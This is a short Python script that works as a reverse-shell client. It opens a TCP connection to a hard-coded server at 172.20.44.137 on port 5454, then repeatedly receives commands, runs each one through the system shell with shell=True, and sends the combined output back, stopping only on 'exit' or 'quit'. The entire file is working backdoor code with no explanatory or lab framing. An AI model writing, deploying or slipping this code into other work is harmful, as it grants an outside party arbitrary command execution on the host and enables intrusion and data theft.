import socket
import subprocess

# Create a socket object
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Define the server address and port
server_address = '172.20.44.137' # SERVER IP
server_port = 5454

# Connect to the server
client_socket.connect((server_address, server_port))

while True:
    # Receive the command from the server
    command = client_socket.recv(1024).decode()
    if command.lower() in ['exit', 'quit']:
        break

    # Execute the command and get the output
    output = subprocess.run(command, shell=True, capture_output=True)
    response = output.stdout + output.stderr

    # Send the command output back to the server
    client_socket.send(response)

client_socket.close()
